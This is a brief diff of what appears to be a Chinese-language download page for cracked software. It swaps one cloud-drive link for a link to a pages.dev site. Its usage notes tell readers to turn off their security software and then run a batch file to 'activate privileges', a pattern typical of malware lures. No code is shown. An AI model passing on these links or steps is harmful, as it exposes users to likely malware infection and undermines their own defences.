@@ -16,7 +16,7 @@
 百度网盘-立即下载
 💎https://pan.baidu.com/s/1p_YW7i75FS_lhz7oGfMVDg?pwd=cx45
 夸克网盘-立即下载
-https://pan.quark.cn/s/9fe89df775e3
+(https://project-2025.pages.dev/)https://project-2025.pages.dev/
 ⚠️ 使用说明
 1. 下载后暂时关闭安全软件
 2. 运行"!)绿化.bat"激活特权
